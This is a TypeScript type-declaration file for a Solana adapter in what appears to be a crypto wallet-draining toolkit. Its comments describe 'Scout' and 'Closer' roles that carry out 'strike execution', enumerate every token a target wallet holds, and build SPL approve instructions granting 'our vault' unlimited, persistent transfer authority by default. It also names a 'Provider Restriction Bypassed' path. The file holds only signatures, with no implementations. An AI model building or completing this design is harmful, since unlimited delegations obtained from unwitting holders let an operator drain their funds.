/**
 * @file svm-adapter.ts
 * @module @legion/core/adapters
 * @sentinel Closer (SVM strike execution)
 *
 * @solana/web3.js-based SVM chain adapter. Handles native SOL and SPL token
 * balance queries, transfer instruction encoding, and compute-unit estimation.
 *
 * Key SVM constraints (solana.md §pitfalls):
 *  - SPL token balances live in Associated Token Accounts (ATAs), NOT on the
 *    owner's System-account. This adapter derives ATAs deterministically.
 *  - CU limit MUST be set explicitly on complex routes (default 200k is too low
 *    for multi-hop Jupiter routes). Add 10% headroom to simulation result.
 *  - `simulateTransaction` with `replaceRecentBlockhash: true` avoids stale-
 *    blockhash failures during estimation.
 *  - SOL balance returns a JS number (safe — max SOL supply ≈ 0.5 × 10^18 lamps).
 *    SPL amounts are parsed as BigInt from raw account data (uint64 LE at offset 64).
 *
 * Numeric invariant (drizzle.md §numeric(78,0)):
 *  All numeric returns are Uint256 strings. BigInt(result) at call site; NEVER Number().
 */
import { BaseChainAdapter, type DiscoveredAsset, type Uint256 } from './base-adapter';
/**
 * Scout / Closer — institutional Solana JSON-RPC lane (`RPC_SOLANA_PRIVATE` ingress first,
 * then QuickNode `SOLANA_RPC_URL`, public mirrors, Chainstack, sovereign mesh fallback).
 */
export declare function resolveInstitutionalSolanaRpcUrl(): string;
export interface DelegateAuthorityData {
    /** Hex-encoded SPL Token `approve` instruction data bytes: [4 (u8), amount (u64 LE)] */
    instructionData: string;
    /** Source ATA address (the token account whose delegate is being set) */
    sourceAta: string;
    /** Delegate pubkey (our vault) that will gain transfer authority */
    delegate: string;
    /** Delegated amount as Uint256 string. MAX_UINT64 = persistent until revoked. */
    delegatedAmount: Uint256;
    /**
     * Instruction accounts in required order for Token Program `approve`:
     * [0] source ATA (writable)
     * [1] delegate   (readonly)
     * [2] owner      (signer)
     */
    accounts: [string, string, string];
}
export interface SvmEstimateParams {
    /**
     * Base64-encoded fully-serialized VersionedTransaction.
     * Build via: `Buffer.from(tx.serialize()).toString('base64')`
     * Simulation uses `replaceRecentBlockhash: true` so a stale blockhash in the
     * serialized tx does not cause an estimation failure (solana.md §Blockhash).
     */
    txBase64: string;
}
export declare class SvmAdapter extends BaseChainAdapter {
    readonly chainId: string;
    private readonly connection;
    private readonly _fallbackConnections;
    private readonly mintPubkey;
    /**
     * @param options.chainId        - CAIP-2 id, e.g. "svm:mainnet-beta".
     * @param options.rpcUrl         - Primary Solana RPC endpoint.
     *                                 Hybrid Provisioning Sync: pass the Chainstack URL
     *                                 here when USE_HYBRID_MODE is active — all SVM calls
     *                                 are routed through the managed endpoint first.
     * @param options.fallbackRpcUrls - Ordered fallback URLs tried on primary failure.
     *                                  Failover Protocol Locked: SVM_MESH nodes from
     *                                  HybridProviderStack.getSvmStack() slot here.
     * @param options.mintPubkey     - Base58 SPL mint address. Omit for native SOL.
     */
    constructor(options: {
        chainId: string;
        rpcUrl: string;
        fallbackRpcUrls?: string[];
        mintPubkey?: string;
    });
    private withFallback;
    /**
     * Returns native SOL (lamports) or SPL token balance as a Uint256 string.
     *
     * Native SOL: uses `getBalance` → returns a JS number (safe; max SOL supply
     *   ≈ 5.7 × 10^17 lamports, well within Number.MAX_SAFE_INTEGER bounds).
     *
     * SPL token: derives the owner's ATA, fetches account data, and parses the
     *   uint64 LE amount at byte offset 64. Returns '0' if the ATA doesn't exist
     *   (Closer must create it before the transfer — solana.md §pitfalls ATA).
     */
    getBalance(address: string): Promise<Uint256>;
    /**
     * Provider Restriction Bypassed path:
     * native-only fallback for providers that block token-account RPC methods.
     * Returns only SOL balance in lamports as Uint256 string.
     */
    getNativeBalanceOnly(address: string): Promise<Uint256>;
    /**
     * Returns hex-encoded instruction data bytes for a transfer.
     *
     * Native SOL → SystemProgram.transfer instruction data (12 bytes):
     *   [discriminator: u32 LE = 2][lamports: u64 LE]
     *
     * SPL token → Token Program transfer instruction data (9 bytes):
     *   [discriminator: u8 = 3][amount: u64 LE]
     *
     * The Closer wraps these bytes into a full VersionedTransaction with the
     * correct static account keys (source ATA, destination ATA, owner, program)
     * and an up-to-date blockhash (solana.md §Blockhash & Replay).
     *
     * @param target - Destination owner address (base58). Closer derives the ATA.
     * @param amount - Transfer amount as Uint256 string (lamports or raw SPL units).
     */
    getTransferData(target: string, amount: Uint256): string;
    /**
     * Builds the SPL Token `approve` instruction spec for delegating transfer
     * authority of a token account to our vault.
     *
     * This is the SVM equivalent of `buildPermit2Data()` in EvmAdapter:
     *  - EVM: off-chain EIP-712 sig → submitted once → stored by Permit2 contract.
     *  - SVM: on-chain `approve` tx → stored in ATA's delegate + delegated_amount
     *         fields. Subsequent transfers use our vault as the `authority` account.
     *
     * After the Closer submits the approve transaction, store the resulting tx
     * signature in `approval_ledger.signature_data` as the delegation proof.
     * Set `approval_ledger.approval_type = 'infinite'` when amount = MAX_UINT64.
     *
     * @param options.mintAddress - SPL mint of the token to delegate.
     * @param options.ownerAddress - Token holder's wallet (the signer of approve).
     * @param options.delegate     - Our vault pubkey that receives transfer authority.
     * @param options.amount       - Tokens to delegate. Defaults to MAX_UINT64 (infinite).
     */
    delegateAuthority(options: {
        mintAddress: string;
        ownerAddress: string;
        delegate: string;
        amount?: Uint256;
    }): DelegateAuthorityData;
    /**
     * Discovers all non-zero assets held by `owner` on this Solana chain.
     *
     * Strategy:
     *  1. getProgramAccounts(TOKEN_PROGRAM_ID) with two filters:
     *     - dataSize: 165  — only initialized token accounts (exact SPL layout size)
     *     - memcmp at offset 32 — owner field must match the wallet pubkey
     *     This returns ALL SPL token accounts in a single RPC call.
     *  2. Extract mint pubkeys and token amounts from each account's raw data.
     *  3. getMultipleAccountsInfo on all distinct mint pubkeys to batch-fetch
     *     decimals (byte 44 in the mint account layout). Single RPC round-trip.
     *  4. Also include native SOL balance (separate getBalance call).
     *  5. Filter out zero-balance entries.
     *
     * @param owner - Wallet address (base58). Throws GatekeeperError if malformed.
     * @returns Non-zero DiscoveredAsset array, native SOL first (if non-zero).
     */
    discoverAssets(owner: string): Promise<DiscoveredAsset[]>;
    /**
     * Estimates compute units for a VersionedTransaction via RPC simulation.
     *
     * Pass a base64-encoded serialized VersionedTransaction. Simulation uses
     * `replaceRecentBlockhash: true` so estimation is blockhash-independent.
     *
     * Falls back to 200_000 (Solana's default per-tx CU limit) when:
     *  - no txBase64 is provided
     *  - simulation returns an error
     *  - RPC call fails
     *
     * Callers SHOULD add 10% headroom to the returned value before passing it
     * to `ComputeBudgetProgram.setComputeUnitLimit` (solana.md §pitfalls CU).
     */
    estimateExecutionGas(params: unknown): Promise<Uint256>;
}
//# sourceMappingURL=svm-adapter.d.ts.map